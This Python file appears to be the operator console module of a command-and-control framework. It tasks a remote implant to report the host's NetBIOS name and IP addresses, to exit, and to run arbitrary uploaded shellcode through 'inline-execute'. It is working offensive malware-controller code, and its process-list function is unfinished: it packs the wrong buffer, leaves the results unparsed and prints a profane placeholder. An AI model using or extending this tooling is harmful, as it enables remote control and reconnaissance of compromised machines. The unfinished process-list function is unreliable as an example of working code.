import time
import base64
import struct

from lib import logging

##
## Command to execute
##
COMMAND_HELLO           = 0
COMMAND_EXITFREE        = 1
COMMAND_INLINE_EXECUTE  = 2

##
## Executes Hello, and returns the result
##
def Task_Hello( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an Hello task
        ##
        Tsk = WebObj.new_task( {
            'code': COMMAND_HELLO,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
        } );

        logging.success( 'Tasked to say hello {}'.format( ClientObj['implant_id'] ) );

        ##
        ## Log
        ##
        if Block:
            while True:
                ##
                ## Get the current task.
                ##
                Obj = WebObj.get_task( str( Tsk['id'] ) )[0];

                ##
                ## Did we succeed?
                ##
                if Obj['status'] == 3:
                    ##
                    ## Print about task.
                    ##
                    logging.success( 'Task was executed. Function returned {}'.format( Obj['return_code'] ) );

                    ##
                    ## Extract information
                    ##
                    if Obj['return_data']:
                        Str = base64.b64decode( Obj['return_data'] );
                        Dsk = Str[ 10 : ].decode().split( '\t' )[ 0 ];
                        Ips = Str[ 10 : ].decode().split( '\t' )[ 1 ];

                        ##
                        ## Printing the netbios information
                        ##
                        logging.print( 'NETBIOS: {}'.format( Dsk ) );

                        ##
                        ## Print the interface and IPv4
                        ## 
                        for Info in Ips.split( ';' ):
                            if Info:
                                logging.print( 'Interface: {} Ipv4: {}'.format( Info.split(':')[ 0 ], Info.split(':')[ 1 ] ) );
                    else:
                        logging.error( 'No return data was recieved' );

                    ##
                    ## Abort!
                    ## 
                    break;
                else:
                    ##
                    ## Wait for a period!
                    ## 
                    time.sleep( 5 );
        else:
            logging.warn( 'Tasking will not print output as blocking is not enabled.' );
    except Exception as e:
        logging.error( e );

##
## Executes ExitFree, and returns the result
##
def Task_ExitFree( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an ExitFree task
        ##
        Tsk = WebObj.new_task( {
            'code': COMMAND_EXITFREE,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
        } );

        logging.success( 'Tasked to exit {}'.format( ClientObj['implant_id'] ) );

        ##
        ## Cannot block
        ##
        if Block:
            ##
            ## Warn the client
            ##
            logging.warn( 'Unable to block for the exit command.' );
    except Exception as e:
        logging.error( e );

##
## Executes InlineTask and returns the result
##
def Task_InlineExecute( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an InlineExecute Task
        ##
        buf  = Args.file.read()
        pkt  = struct.pack( '!II', len( buf ), 0 );
        pkt += buf
        pkt += b''

        Tsk = WebObj.new_task( {
            'code': COMMAND_INLINE_EXECUTE,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
        } );

        logging.success( 'Tasked to execute inline-execute' );

        ##
        ##
        ##
        if Block:
            logging.warn( 'Unable to block for inline-execute' );
    except Exception as e:
        logging.error( e );

##
## Executes 'processlist' as InlineTask and return the result
##
def Task_InlineExecute_ProcessList( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an InlineExecute Task
        ##
        buf  = Args.shellcode.read()
        pkt  = struct.pack( '!II', len( buf ), 0 );
        pkt += buf
        buf += b''

        Tsk = WebObj.new_task( {
            'code': COMMAND_INLINE_EXECUTE,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
        } );

        logging.success( 'Tasked to inline-execute processlist' );

        ##
        ##
        ##
        if Block:
            ##
            ## Create a tabulate table of this information
            ##
            while True:
                ##
                ## Extract the current task
                ##
                Obj = WebObj.get_task( str( Tsk['id'] ) )[0];

                ##
                ## Check the status
                ##
                if Obj['status'] == 3:
                    ##
                    ## Print 
                    ##
                    logging.success( 'Task was executed successfully and returned code {}'.format( Obj['return_code'] ) );

                    if Obj['return_data']:
                        ##
                        ## Create tabulate table and print it.
                        ##
                        Buf = base64.b64decode( Obj['return_data'] );
                        Hdr = [ "Process Name", "PID", "PPID" ]

                        ##
                        ## Extract each value
                        ##
                        print('FUCK ME!');
                    else:
                        logging.error( 'No return data was recieved' );

                    ##
                    ## Abort
                    ##
                    break;
    except Exception as e:
        logging.error( e );
